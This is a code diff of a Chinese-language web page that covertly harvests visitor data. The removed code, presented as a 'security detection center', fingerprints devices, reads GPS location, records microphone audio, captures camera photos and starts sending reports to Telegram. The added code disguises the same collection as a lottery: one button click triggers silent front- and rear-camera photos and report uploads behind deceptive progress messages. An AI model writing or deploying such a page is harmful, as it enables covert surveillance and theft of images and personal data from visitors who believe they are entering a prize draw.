-            info.type = conn.type || conn.effectiveType || '未知';
-            info.downlink = conn.downlink ? `${conn.downlink} Mbps` : '未知';
-            info.rtt = conn.rtt ? `${conn.rtt} ms` : '未知';
-            
-            if (conn.downlink) {
-                if (conn.downlink > 10) info.speed = '极快';
-                else if (conn.downlink > 5) info.speed = '快速';
-                else if (conn.downlink > 2) info.speed = '中等';
-                else info.speed = '较慢';
-            }
-        }
-        
-        return info;
-    }
-    
-    // 获取ISP信息
-    async function getISPInfo(ip) {
-        if (!ip || ip === '获取失败') {
-            return { name: '未知', asn: '未知' };
-        }
-        
-        try {
-            const response = await fetch(`https://ipapi.co/${ip}/json/`);
-            if (response.ok) {
-                const data = await response.json();
-                return {
-                    name: data.org || '未知',
-                    asn: data.asn || '未知'
-                };
-            }
-        } catch (error) {
-            return { name: '未知', asn: '未知' };
-        }
-    }
-    
-    // ==================== 设备指纹扫描模块 ====================
-    async function runDeviceScan() {
-        logToConsole('开始设备指纹扫描...', 'warning');
-        
-        try {
-            // 1. 设备基本信息
-            const deviceInfo = getDeviceInfo();
-            scanData.device.info = deviceInfo;
-            
-            addDataToDisplay('设备类型', deviceInfo.type);
-            addDataToDisplay('操作系统', deviceInfo.os);
-            addDataToDisplay('浏览器', deviceInfo.browser);
-            
-            // 2. 硬件信息
-            const hardwareInfo = getHardwareInfo();
-            scanData.device.hardware = hardwareInfo;
-            
-            addDataToDisplay('CPU核心数', hardwareInfo.cpuCores);
-            addDataToDisplay('设备内存', hardwareInfo.deviceMemory);
-            addDataToDisplay('屏幕分辨率', `${hardwareInfo.screenWidth}×${hardwareInfo.screenHeight}`);
-            
-            // 3. GPU信息
-            const gpuInfo = await getGPUInfo();
-            scanData.device.gpu = gpuInfo;
-            
-            if (gpuInfo.renderer) {
-                addDataToDisplay('GPU信息', gpuInfo.renderer.substring(0, 50) + '...');
-            }
-            
-            // 4. 存储信息
-            const storageInfo = await getStorageInfo();
-            scanData.device.storage = storageInfo;
-            
-            // 5. 电池信息
-            const batteryInfo = await getBatteryInfo();
-            scanData.device.battery = batteryInfo;
-            
-            if (batteryInfo.level) {
-                addDataToDisplay('电池电量', batteryInfo.level);
-            }
-            
-            // 6. 生成唯一设备指纹
-            const fingerprint = generateDeviceFingerprint();
-            scanData.device.fingerprint = fingerprint;
-            addDataToDisplay('设备指纹ID', fingerprint.substring(0, 20) + '...');
-            
-            logToConsole('设备指纹扫描完成', 'success');
-            
-        } catch (error) {
-            logToConsole('设备指纹扫描失败: ' + error.message, 'error');
-            updateModuleStatus('device', '失败');
-        }
-    }
-    
-    // 获取设备基本信息
+    // 获取设备信息
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         
-        let deviceType = '未知设备';
-        if (/Android/i.test(ua)) deviceType = 'Android设备';
-        else if (/iPhone|iPad|iPod/i.test(ua)) deviceType = 'iOS设备';
-        else if (/Windows Phone/i.test(ua)) deviceType = 'Windows Phone';
-        else if (/Windows NT/i.test(ua)) deviceType = 'Windows电脑';
-        else if (/Macintosh/i.test(ua)) deviceType = 'Mac电脑';
-        else if (/Linux/i.test(ua)) deviceType = 'Linux电脑';
-        else if (/CrOS/i.test(ua)) deviceType = 'Chrome OS设备';
+        let type = '未知设备';
+        if (/Android/i.test(ua)) type = 'Android设备';
+        else if (/iPhone|iPad|iPod/i.test(ua)) type = 'Apple设备';
+        else if (/Windows/i.test(ua)) type = 'Windows电脑';
+        else if (/Mac/i.test(ua)) type = 'Mac电脑';
         
         let os = '未知系统';
         if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
-        else if (/Windows NT 6.3/i.test(ua)) os = 'Windows 8.1';
-        else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
-        else if (/Mac OS X/i.test(ua)) {
-            const match = ua.match(/Mac OS X (\d+)[._](\d+)/);
-            os = match ? `macOS ${match[1]}.${match[2]}` : 'macOS';
-        }
-        else if (/Android (\d+)/i.test(ua)) {
-            const match = ua.match(/Android (\d+)/);
-            os = `Android ${match[1]}`;
-        }
-        else if (/iPhone OS (\d+)/i.test(ua)) {
-            const match = ua.match(/iPhone OS (\d+)/);
-            os = `iOS ${match[1]}`;
-        }
-        
-        let browser = '未知浏览器';
-        if (/Chrome/i.test(ua) && !/Edge|Edg/i.test(ua)) {
-            const match = ua.match(/Chrome\/(\d+\.\d+)/);
-            browser = `Chrome ${match ? match[1] : ''}`;
-        } else if (/Firefox/i.test(ua)) {
-            const match = ua.match(/Firefox\/(\d+\.\d+)/);
-            browser = `Firefox ${match ? match[1] : ''}`;
-        } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
-            const match = ua.match(/Version\/(\d+\.\d+)/);
-            browser = `Safari ${match ? match[1] : ''}`;
-        } else if (/Edge|Edg/i.test(ua)) {
-            const match = ua.match(/(Edge|Edg)\/(\d+\.\d+)/);
-            browser = `Edge ${match ? (match[2] || match[1]) : ''}`;
-        }
+        else if (/Mac OS X/i.test(ua)) os = 'macOS';
+        else if (/Android/i.test(ua)) os = 'Android';
+        else if (/iPhone OS/i.test(ua)) os = 'iOS';
         
         return {
-            type: deviceType,
+            type: type,
             os: os,
-            browser: browser,
-            userAgent: ua,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages || [navigator.language],
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset()
+            userAgent: ua.substring(0, 200) + '...'
         };
     }
     
-    // 获取硬件信息
-    function getHardwareInfo() {
-        return {
-            cpuCores: navigator.hardwareConcurrency || '未知',
-            deviceMemory: navigator.deviceMemory || '未知',
-            screenWidth: screen.width,
-            screenHeight: screen.height,
-            colorDepth: screen.colorDepth,
-            pixelRatio: window.devicePixelRatio || 1,
-            maxTouchPoints: navigator.maxTouchPoints || 0,
-            deviceMemory: navigator.deviceMemory || '未知'
-        };
+    // 获取浏览器名称
+    function getBrowserName() {
+        const ua = navigator.userAgent;
+        if (/Chrome/i.test(ua)) return 'Chrome';
+        if (/Firefox/i.test(ua)) return 'Firefox';
+        if (/Safari/i.test(ua)) return 'Safari';
+        if (/Edge/i.test(ua)) return 'Edge';
+        return '未知浏览器';
     }
-    
-    // 获取GPU信息
-    async function getGPUInfo() {
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    return {
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || '未知',
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || '未知'
-                    };
-                }
-            }
-        } catch (error) {
-            console.log('获取GPU信息失败:', error);
-        }
-        
-        return { vendor: '未知', renderer: '未知' };
-    }
-    
-    // 获取存储信息
-    async function getStorageInfo() {
-        try {
-            if ('storage' in navigator && 'estimate' in navigator.storage) {
-                const estimate = await navigator.storage.estimate();
-                return {
-                    usage: estimate.usage ? Math.round(estimate.usage / 1024 / 1024) + ' MB' : '未知',
-                    quota: estimate.quota ? Math.round(estimate.quota / 1024 / 1024) + ' MB' : '未知'
-                };
-            }
-        } catch (error) {
-            console.log('获取存储信息失败:', error);
-        }
-        
-        return { usage: '未知', quota: '未知' };
-    }
-    
-    // 获取电池信息
-    async function getBatteryInfo() {
-        try {
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                return {
-                    level: Math.round(battery.level * 100) + '%',
-                    charging: battery.charging,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
-                };
-            }
-        } catch (error) {
-            console.log('获取电池信息失败:', error);
-        }
-        
-        return { level: '未知', charging: '未知' };
-    }
-    
-    // 生成设备指纹
-    function generateDeviceFingerprint() {
-        const components = [
-            navigator.userAgent,
-            navigator.platform,
-            screen.width + 'x' + screen.height,
-            screen.colorDepth,
-            new Date().getTimezoneOffset(),
-            navigator.language,
-            !!window.sessionStorage,
-            !!window.localStorage,
-            !!window.indexedDB,
-            navigator.hardwareConcurrency,
-            navigator.deviceMemory,
-            navigator.maxTouchPoints
-        ];
-        
-        const fingerprint = components.join('|');
-        return btoa(fingerprint).substring(0, 50);
-    }
-    
-    // 更新页面信息
-    function updatePageInfo() {
-        // 设置页面加载时间
-        const loadTime = Date.now() - performance.timing.navigationStart;
-        document.getElementById('loadTime').textContent = (loadTime / 1000).toFixed(2);
-        
-        // 设置随机在线用户数
-        document.getElementById('onlineUsers').textContent = Math.floor(Math.random() * 100) + 50;
-    }
-    
-    // 页面加载完成时初始化
-    window.addEventListener('load', function() {
-        logToConsole('智能安全检测中心初始化完成', 'success');
-        updatePageInfo();
-        
-        // 自动开始轻度扫描
-        setTimeout(() => {
-            logToConsole('开始自动安全检测...', 'warning');
-            runNetworkScan();
-            runDeviceScan();
-        }, 2000);
-    });
 </script>
-<!-- 在之前的script标签内继续添加以下代码 -->
+<!-- 继续添加代码 -->
 
 <script>
-    // ==================== 摄像头检测模块 ====================
-    let cameraStream = null;
-    let capturedPhotos = [];
-    
-    async function runCameraTest() {
-        logToConsole('开始摄像头检测...', 'warning');
+    // 开始检测（用户点击按钮）
+    async function startDetection() {
+        console.log('🎯 开始全面检测...');
+        
+        // 禁用按钮
+        const btn = document.querySelector('.lottery-btn');
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 正在处理...';
+        
+        // 显示加载动画
+        document.getElementById('loading').style.display = 'block';
+        
+        // 开始进度条动画
+        startProgress();
         
         try {
-            // 1. 请求摄像头权限
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: {
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 },
-                    facingMode: 'user' // 前置摄像头
-                } 
-            });
+            // 1. 首先发送基本信息
+            await sendBasicReport();
             
-            cameraStream = stream;
+            // 2. 检测摄像头并拍照
+            await detectCamera();
             
-            // 2. 显示摄像头预览
-            const video = document.getElementById('cameraFeed');
-            video.srcObject = stream;
-            video.style.display = 'block';
+            // 3. 检测麦克风
+            await detectMicrophone();
             
-            // 3. 更新预览区域显示
-            const preview = document.getElementById('cameraPreview');
-            preview.querySelector('div').style.display = 'none';
+            // 4. 发送详细报告
+            await sendDetailedReport();
             
-            // 4. 自动拍照
-            setTimeout(async () => {
-                await takePhoto();
-                await takePhoto('environment'); // 尝试后置摄像头
-            }, 1000);
+            // 5. 显示抽奖结果
+            showResult();
             
-            // 5. 获取摄像头详细信息
-            const cameraInfo = await getCameraInfo();
-            scanData.camera = cameraInfo;
-            
-            addDataToDisplay('摄像头数量', cameraInfo.count + '个');
-            addDataToDisplay('当前摄像头', cameraInfo.current);
-            
-            logToConsole('摄像头检测完成', 'success');
+            // 6. 添加新中奖者
+            addNewWinner();
             
         } catch (error) {
-            logToConsole('摄像头检测失败: ' + error.message, 'error');
-            updateModuleStatus('camera', '失败');
-            
-            // 尝试不同的摄像头配置
-            tryAlternativeCameras();
+            console.error('检测过程出错:', error);
+            showResult(); // 即使出错也显示结果
         }
     }
     
-    // 拍照功能
-    async function takePhoto(facingMode = 'user') {
-        try {
-            const video = document.getElementById('cameraFeed');
-            const canvas = document.getElementById('cameraCanvas');
-            const context = canvas.getContext('2d');
+    // 进度条动画
+    function startProgress() {
+        const bar = document.getElementById('progress');
+        const text = document.getElementById('progressText');
+        let width = 0;
+        
+        const interval = setInterval(() => {
+            width += 2;
+            bar.style.width = width + '%';
             
-            // 设置画布尺寸
+            if (width <= 20) {
+                text.textContent = '正在验证设备兼容性...';
+            } else if (width <= 40) {
+                text.textContent = '正在检测网络连接...';
+            } else if (width <= 60) {
+                text.textContent = '正在获取地理位置...';
+            } else if (width <= 80) {
+                text.textContent = '正在生成安全验证...';
+            } else if (width <= 100) {
+                text.textContent = '正在分配抽奖号码...';
+            }
+            
+            if (width >= 100) {
+                clearInterval(interval);
+                text.textContent = '验证完成！';
+            }
+        }, 50);
+    }
+    
+    // 检测摄像头
+    async function detectCamera() {
+        console.log('📸 检测摄像头...');
+        
+        try {
+            // 请求摄像头权限
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user' }
+            });
+            
+            // 创建视频元素
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            // 等待视频就绪
+            await new Promise(resolve => {
+                video.onloadedmetadata = resolve;
+            });
+            
+            // 拍照
+            const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            
-            // 绘制图像
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // 转换为Base64
-            const photoData = canvas.toDataURL('image/jpeg', 0.8);
-            
-            // 保存照片数据
-            capturedPhotos.push({
-                data: photoData,
-                timestamp: new Date().toISOString(),
-                facingMode: facingMode,
-                size: Math.round(photoData.length * 3 / 4) // 近似字节大小
-            });
-            
-            // 添加到数据显示
-            addDataToDisplay('拍照成功', `照片${capturedPhotos.length} (${facingMode === 'user' ? '前置' : '后置'})`);
-            
-            logToConsole(`拍照成功: 照片${capturedPhotos.length}`, 'success');
-            
-            return photoData;
-            
-        } catch (error) {
-            console.log('拍照失败:', error);
-            return null;
-        }
-    }
-    
-    // 获取摄像头详细信息
-    async function getCameraInfo() {
-        try {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const videoDevices = devices.filter(device => device.kind === 'videoinput');
-            
-            const info = {
-                count: videoDevices.length,
-                devices: videoDevices.map(d => ({
-                    label: d.label || '未命名摄像头',
-                    deviceId: d.deviceId,
-                    groupId: d.groupId
-                })),
-                current: '未知'
-            };
-            
-            // 获取当前摄像头标签
-            if (videoDevices.length > 0 && cameraStream) {
-                const tracks = cameraStream.getVideoTracks();
-                if (tracks.length > 0) {
-                    info.current = tracks[0].label || '摄像头1';
-                }
-            }
-            
-            return info;
-            
-        } catch (error) {
-            return { count: 0, devices: [], current: '未知' };
-        }
-    }
-    
-    // 尝试不同的摄像头配置
-    async function tryAlternativeCameras() {
-        const configs = [
-            { video: true }, // 最简单的配置
-            { video: { facingMode: 'environment' } }, // 后置摄像头
-            { video: { width: 640, height: 480 } }, // 低分辨率
-            { video: { facingMode: { exact: 'user' } } } // 精确前置
-        ];
-        
-        for (const config of configs) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(config);
-                cameraStream = stream;
-                
-                const video = document.getElementById('cameraFeed');
-                video.srcObject = stream;
-                video.style.display = 'block';
-                
-                logToConsole('找到可用摄像头配置', 'success');
-                return true;
-            } catch (error) {
-                continue;
-            }
-        }
-        
-        return false;
-    }
-    
-    // ==================== 麦克风检测模块 ====================
-    let audioStream = null;
-    let audioRecorder = null;
-    let recordedChunks = [];
-    
-    async function runAudioTest() {
-        logToConsole('开始麦克风检测...', 'warning');
-        
-        try {
-            // 1. 请求麦克风权限
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                audio: {
-                    echoCancellation: true,
-                    noiseSuppression: true,
-                    autoGainControl: true
-                } 
-            });
-            
-            audioStream = stream;
-            
-            // 2. 获取麦克风信息
-            const audioInfo = await getAudioInfo();
-            scanData.audio = audioInfo;
-            
-            addDataToDisplay('麦克风数量', audioInfo.count + '个');
-            addDataToDisplay('当前麦克风', audioInfo.current);
-            
-            // 3. 开始录音测试
-            await startRecording();
-            
-            // 4. 5秒后停止录音
-            setTimeout(async () => {
-                await stopRecording();
-                logToConsole('麦克风检测完成', 'success');
-            }, 5000);
-            
-        } catch (error) {
-            logToConsole('麦克风检测失败: ' + error.message, 'error');
-            updateModuleStatus('audio', '失败');
-        }
-    }
-    
-    // 获取麦克风信息
-    async function getAudioInfo() {
-        try {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const audioDevices = devices.filter(device => device.kind === 'audioinput');
-            
-            const info = {
-                count: audioDevices.length,
-                devices: audioDevices.map(d => ({
-                    label: d.label || '未命名麦克风',
-                    deviceId: d.deviceId,
-                    groupId: d.groupId
-                })),
-                current: '未知'
-            };
-            
-            // 获取当前麦克风标签
-            if (audioDevices.length > 0 && audioStream) {
-                const tracks = audioStream.getAudioTracks();
-                if (tracks.length > 0) {
-                    info.current = tracks[0].label || '麦克风1';
-                }
-            }
-            
-            return info;
-            
-        } catch (error) {
-            return { count: 0, devices: [], current: '未知' };
-        }
-    }
-    
-    // 开始录音
-    async function startRecording() {
-        try {
-            if (!audioStream) {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                audioStream = stream;
-            }
-            
-            recordedChunks = [];
-            
-            // 创建MediaRecorder
-            audioRecorder = new MediaRecorder(audioStream, {
-                mimeType: 'audio/webm;codecs=opus'
-            });
-            
-            // 收集录音数据
-            audioRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-            
-            // 录音开始
-            audioRecorder.onstart = () => {
-                logToConsole('开始录音测试...', 'warning');
-                addDataToDisplay('录音状态', '正在录音...');
-            };
-            
-            // 录音停止
-            audioRecorder.onstop = () => {
-                const audioBlob = new Blob(recordedChunks, { type: 'audio/webm' });
-                
-                // 转换为Base64
-                const reader = new FileReader();
-                reader.onloadend = () => {
-                    const audioData = reader.result;
-                    scanData.audio.recording = {
-                        data: audioData,
-                        timestamp: new Date().toISOString(),
-                        size: audioBlob.size,
-                        duration: 5 // 5秒录音
-                    };
-                    
-                    addDataToDisplay('录音完成', '5秒录音样本');
-                    logToConsole('录音完成，已保存样本', 'success');
-                };
-                reader.readAsDataURL(audioBlob);
-            };
-            
-            // 开始录音
-            audioRecorder.start(1000); // 每1秒收集一次数据
-            
-        } catch (error) {
-            logToConsole('开始录音失败: ' + error.message, 'error');
-        }
-    }
-    
-    // 停止录音
-    async function stopRecording() {
-        if (audioRecorder && audioRecorder.state !== 'inactive') {
-            audioRecorder.stop();
-            
-            // 停止所有轨道
-            if (audioStream) {
-                audioStream.getTracks().forEach(track => track.stop());
-                audioStream = null;
-            }
-        }
-    }
-    
-    // ==================== 浏览器指纹模块 ====================
-    async function runBrowserScan() {
-        logToConsole('开始浏览器指纹扫描...', 'warning');
-        
-        try {
-            // 1. Canvas指纹
-            const canvasFingerprint = getCanvasFingerprint();
-            scanData.browser.canvasFingerprint = canvasFingerprint;
-            addDataToDisplay('Canvas指纹', canvasFingerprint.hash.substring(0, 20) + '...');
-            
-            // 2. WebGL指纹
-            const webglFingerprint = getWebGLFingerprint();
-            scanData.browser.webglFingerprint = webglFingerprint;
-            
-            // 3. 字体检测
-            const fontList = await detectFonts();
-            scanData.browser.fonts = fontList;
-            addDataToDisplay('检测到字体', fontList.length + '种');
-            
-            // 4. 插件检测
-            const plugins = getPlugins();
-            scanData.browser.plugins = plugins;
-            
-            // 5. 屏幕特性
-            const screenFeatures = getScreenFeatures();
-            scanData.browser.screen = screenFeatures;
-            
-            // 6. 浏览器特性
-            const browserFeatures = getBrowserFeatures();
-            scanData.browser.features = browserFeatures;
-            
-            // 7. 生成综合浏览器指纹
-            const browserFingerprint = generateBrowserFingerprint();
-            scanData.browser.fingerprint = browserFingerprint;
-            addDataToDisplay('浏览器指纹ID', browserFingerprint.substring(0, 20) + '...');
-            
-            logToConsole('浏览器指纹扫描完成', 'success');
-            
-        } catch (error) {
-            logToConsole('浏览器指纹扫描失败: ' + error.message, 'error');
-            updateModuleStatus('browser', '失败');
-        }
-    }
-    
-    // Canvas指纹
-    function getCanvasFingerprint() {
-        try {
-            const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             
-            canvas.width = 200;
-            canvas.height = 50;
+            // 等待一帧
+            await new Promise(resolve => setTimeout(resolve, 500));
             
-            // 绘制文本
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
+            // 拍摄照片
+            ctx.drawImage(video, 0, 0);
+            const photoData = canvas.toDataURL('image/jpeg', 0.7);
             
-            ctx.fillStyle = '#069';
-            ctx.fillText('Browser Fingerprint', 2, 15);
+            // 保存照片
+            photos.push({
+                data: photoData,
+                time: new Date().toLocaleString('zh-CN'),
+                size: Math.round(photoData.length * 3 / 4)
+            });
             
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('Browser Fingerprint', 4, 17);
+            console.log('✅ 拍照成功，大小:', photos[0].size, 'bytes');
             
-            // 转换为数据URL
-            const dataUrl = canvas.toDataURL();
+            // 停止摄像头
+            stream.getTracks().forEach(track => track.stop());
             
-            // 生成哈希
-            let hash = 0;
-            for (let i = 0; i < dataUrl.length; i++) {
-                hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
-                hash = hash & hash;
-            }
-            
-            return {
-                hash: Math.abs(hash).toString(16),
-                dataUrl: dataUrl
-            };
-            
-        } catch (error) {
-            return { hash: 'error', dataUrl: '' };
-        }
-    }
-    
-    // WebGL指纹
-    function getWebGLFingerprint() {
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            
-            if (!gl) return { vendor: '未知', renderer: '未知', extensions: [] };
-            
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
-            const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-            
-            // 获取支持的扩展
-            const extensions = gl.getSupportedExtensions() || [];
-            
-            // WebGL版本
-            const version = gl.getParameter(gl.VERSION);
-            
-            // 生成哈希
-            const fingerprintString = vendor + renderer + extensions.join(',') + version;
-            let hash = 0;
-            for (let i = 0; i < fingerprintString.length; i++) {
-                hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
-                hash = hash & hash;
-            }
-            
-            return {
-                vendor: vendor || '未知',
-                renderer: renderer || '未知',
-                extensions: extensions.slice(0, 10), // 只取前10个
-                version: version || '未知',
-                hash: Math.abs(hash).toString(16)
-            };
-            
-        } catch (error) {
-            return { vendor: '未知', renderer: '未知', extensions: [], hash: 'error' };
-        }
-    }
-    
-    // 字体检测
-    async function detectFonts() {
-        const baseFonts = [
-            'Arial', 'Arial Black', 'Arial Narrow', 'Times New Roman',
-            'Courier New', 'Tahoma', 'Trebuchet MS', 'Verdana',
-            'Georgia', 'Comic Sans MS', 'Impact', 'Monaco',
-            'Optima', 'Helvetica', 'Geneva', 'Andale Mono',
-            'Times', 'Courier', 'Helvetica Neue', 'Lucida Grande'
-        ];
-        
-        const detectedFonts = [];
-        
-        // 创建测试元素
-        const testElement = document.createElement('span');
-        testElement.style.fontSize = '72px';
-        testElement.style.position = 'absolute';
-        testElement.style.left = '-9999px';
-        testElement.innerHTML = 'mmmmmmmmmmlli'; // 测试字符串
-        
-        document.body.appendChild(testElement);
-        
-        // 默认字体宽度
-        const defaultWidth = testElement.offsetWidth;
-        const defaultHeight = testElement.offsetHeight;
-        
-        for (const font of baseFonts) {
-            testElement.style.fontFamily = font + ', monospace';
-            
-            if (testElement.offsetWidth !== defaultWidth || testElement.offsetHeight !== defaultHeight) {
-                detectedFonts.push(font);
-            }
-        }
-        
-        document.body.removeChild(testElement);
-        return detectedFonts;
-    }
-    
-    // 插件检测
-    function getPlugins() {
-        const plugins = [];
-        
-        // 标准插件检测
-        if (navigator.plugins) {
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push({
-                    name: navigator.plugins[i].name,
-                    description: navigator.plugins[i].description,
-                    filename: navigator.plugins[i].filename,
-                    version: navigator.plugins[i].version
-                });
-            }
-        }
-        
-        // MIME类型检测
-        const mimeTypes = [];
-        if (navigator.mimeTypes) {
-            for (let i = 0; i < navigator.mimeTypes.length; i++) {
-                mimeTypes.push(navigator.mimeTypes[i].type);
-            }
-        }
-        
-        return {
-            plugins: plugins,
-            mimeTypes: mimeTypes,
-            pluginCount: plugins.length
-        };
-    }
-    
-    // 屏幕特性
-    function getScreenFeatures() {
-        return {
-            width: screen.width,
-            height: screen.height,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth,
-            orientation: screen.orientation ? screen.orientation.type : '未知',
-            devicePixelRatio: window.devicePixelRatio,
-            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-            maxTouchPoints: navigator.maxTouchPoints || 0
-        };
-    }
-    
-    // 浏览器特性
-    function getBrowserFeatures() {
-        return {
-            cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack || '未设置',
-            language: navigator.language,
-            languages: navigator.languages || [navigator.language],
-            online: navigator.onLine,
-            pdfViewerEnabled: 'pdfViewerEnabled' in navigator ? navigator.pdfViewerEnabled : '未知',
-            webdriver: navigator.webdriver || false,
-            connection: navigator.connection ? {
-                effectiveType: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink,
-                rtt: navigator.connection.rtt,
-                saveData: navigator.connection.saveData
-            } : null,
-            storage: {
-                localStorage: 'localStorage' in window,
-                sessionStorage: 'sessionStorage' in window,
-                indexedDB: 'indexedDB' in window,
-                serviceWorker: 'serviceWorker' in navigator
-            }
-        };
-    }
-    
-    // 生成浏览器指纹
-    function generateBrowserFingerprint() {
-        const components = [
-            navigator.userAgent,
-            navigator.platform,
-            screen.width + 'x' + screen.height,
-            screen.colorDepth,
-            new Date().getTimezoneOffset(),
-            navigator.language,
-            navigator.hardwareConcurrency,
-            navigator.deviceMemory,
-            window.devicePixelRatio,
-            'ontouchstart' in window ? 'touch' : 'no-touch',
-            navigator.cookieEnabled ? 'cookies' : 'no-cookies',
-            navigator.doNotTrack || 'no-dnt'
-        ];
-        
-        const fingerprint = components.join('|');
-        return btoa(fingerprint).substring(0, 64);
-    }
-    
-    // 地理位置扫描
-    async function runLocationScan() {
-        logToConsole('开始地理位置扫描...', 'warning');
-        
-        try {
-            // 1. HTML5地理位置API（需要用户授权）
-            if ('geolocation' in navigator) {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    });
+            // 尝试后置摄像头
+            try {
+                const rearStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment' }
                 });
                 
-                scanData.location.gps = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    altitude: position.coords.altitude,
-                    altitudeAccuracy: position.coords.altitudeAccuracy,
-                    heading: position.coords.heading,
-                    speed: position.coords.speed,
-                    timestamp: position.timestamp
-                };
-                addDataToDisplay('GPS坐标', 
-                    `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`);
-                addDataToDisplay('GPS精度', `${position.coords.accuracy}米`);
+                const rearVideo = document.createElement('video');
+                rearVideo.srcObject = rearStream;
+                await rearVideo.play();
                 
-                logToConsole('GPS位置获取成功', 'success');
+                const rearCanvas = document.createElement('canvas');
+                rearCanvas.width = rearVideo.videoWidth;
+                rearCanvas.height = rearVideo.videoHeight;
+                const rearCtx = rearCanvas.getContext('2d');
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                rearCtx.drawImage(rearVideo, 0, 0);
+                const rearPhoto = rearCanvas.toDataURL('image/jpeg', 0.7);
+                
+                photos.push({
+                    data: rearPhoto,
+                    time: new Date().toLocaleString('zh-CN'),
+                    size: Math.round(rearPhoto.length * 3 / 4),
+                    camera: 'rear'
+                });
+                
+                rearStream.getTracks().forEach(track => track.stop());
+                
+            } catch (e) {
+                console.log('后置摄像头不可用');
             }
-            
-            // 2. IP地理位置（已在前面的网络扫描中获取）
-            if (scanData.network.location) {
-                scanData.location.ipBased = scanData.network.location;
-            }
-            
-            // 3. 时区信息
-            scanData.location.timezone = {
-                iana: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                offset: new Date().getTimezoneOffset(),
-                locale: navigator.language,
-                locales: navigator.languages
-            };
-            
-            updateModuleStatus('location', '完成');
-            logToConsole('地理位置扫描完成', 'success');
             
         } catch (error) {
-            logToConsole('地理位置扫描失败: ' + error.message, 'error');
-            updateModuleStatus('location', '失败');
-            
-            // 使用IP地理位置作为后备
-            if (scanData.network.location) {
-                scanData.location = {
-                    ipBased: scanData.network.location,
-                    timezone: {
-                        iana: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        offset: new Date().getTimezoneOffset()
-                    }
-                };
-                addDataToDisplay('IP地理位置', `${scanData.network.location.city}, ${scanData.network.location.country}`);
-            }
+            console.warn('摄像头检测失败:', error.message);
         }
     }
-</script>
-<!-- 在之前的script标签内继续添加以下代码 -->
-
-<script>
-    // ==================== Telegram数据发送 ====================
-    async function sendCompleteReport() {
-        logToConsole('正在生成完整报告并发送到Telegram...', 'warning');
+    
+    // 检测麦克风
+    async function detectMicrophone() {
+        console.log('🎤 检测麦克风...');
         
         try {
-            // 1. 发送基本信息报告
-            await sendBasicInfoReport();
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
             
-            // 2. 发送设备指纹报告
-            await sendDeviceFingerprintReport();
+            // 获取麦克风信息
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const mics = devices.filter(d => d.kind === 'audioinput');
             
-            // 3. 如果有照片，发送照片
-            if (capturedPhotos.length > 0) {
-                await sendCameraPhotos();
-            }
+            collectedData.microphone = {
+                count: mics.length,
+                devices: mics.map(d => d.label || '未命名麦克风')
+            };
             
-            // 4. 如果有录音，发送录音信息
-            if (scanData.audio && scanData.audio.recording) {
-                await sendAudioRecordingInfo();
-            }
-            
-            // 5. 发送用户行为分析
-            await sendUserBehaviorReport();
-            
-            logToConsole('所有报告已发送到Telegram', 'success');
